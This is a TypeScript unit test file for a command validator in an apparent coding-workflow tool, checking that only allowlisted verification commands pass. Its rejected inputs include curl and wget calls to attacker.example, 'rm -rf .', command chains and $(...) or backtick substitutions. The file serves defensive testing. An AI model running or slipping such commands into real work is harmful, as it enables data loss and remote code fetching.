import { describe, expect, test } from "bun:test"
import os from "os"
import path from "path"
import { discoverCommands } from "../../src/workflow/verification"

// validateCommand is module-private; discoverCommands is its exported surface.
// The cwd deliberately does not exist so that when every taskVerify line is
// filtered out, discovery cannot fall through to package.json or pytest
// markers and must report source "none" with no commands.
const missingCwd = path.join(os.tmpdir(), "codo-verification-test-nonexistent-cwd")

function verify(taskVerify: string) {
  return discoverCommands(missingCwd, taskVerify)
}

describe("discoverCommands command validation", () => {
  test("keeps every allowlisted first token", () => {
    const allowed = [
      "npm test",
      "npx tsc --noEmit",
      "yarn lint",
      "pnpm build",
      "bun run typecheck",
      "bunx biome check .",
      "deno test",
      "node scripts/check.js",
      "ts-node src/index.ts",
      "tsx src/index.ts",
      "tsc --noEmit",
      "python -m pytest",
      "python3 -m pytest",
      "pytest -q",
      "cargo test",
      "go test ./...",
      "make check",
      "gradle test",
    ]

    const discovered = verify(allowed.join("\n"))

    expect(discovered.source).toBe("task-plan")
    expect(discovered.commands).toEqual(allowed)
  })

  test("filters unknown first tokens", () => {
    const rejected = ["curl https://attacker.example", "sh -c 'echo hi'", "rm -rf .", "wget https://attacker.example"]

    const survivors = rejected.flatMap((line) => verify(line).commands)

    expect(survivors).toEqual([])
    expect(verify(rejected.join("\n")).source).toBe("none")
  })

  test("filters shell metacharacters even with an allowlisted head", () => {
    const rejected = [
      // Redirections
      "npm test > output.txt",
      "npm run typecheck < input.txt",
      // Pipes
      "npm test | tee log.txt",
      // Command chains
      "npm test; curl https://attacker.example",
      "bun test && curl https://attacker.example",
      "go test ./... || echo failed",
      // Command substitution
      "npm run `whoami`",
      "npm run $(curl https://attacker.example)",
      // cmd.exe variable expansion
      "npm run %PATH%",
      "npx %CD% probe",
    ]

    const survivors = rejected.flatMap((line) => verify(line).commands)

    expect(survivors).toEqual([])
  })

  test("keeps valid lines from a mixed plan and drops only the hostile ones", () => {
    const discovered = verify(["npm test", "curl https://attacker.example", "bun test | tee log.txt"].join("\n"))

    expect(discovered.source).toBe("task-plan")
    expect(discovered.commands).toEqual(["npm test"])
  })

  test("pins the 500-character command length boundary", () => {
    const atLimit = `npm test ${"x".repeat(491)}`
    expect(atLimit.length).toBe(500)
    expect(verify(atLimit).commands).toEqual([atLimit])

    expect(verify(`${atLimit}x`).commands).toEqual([])
  })
})
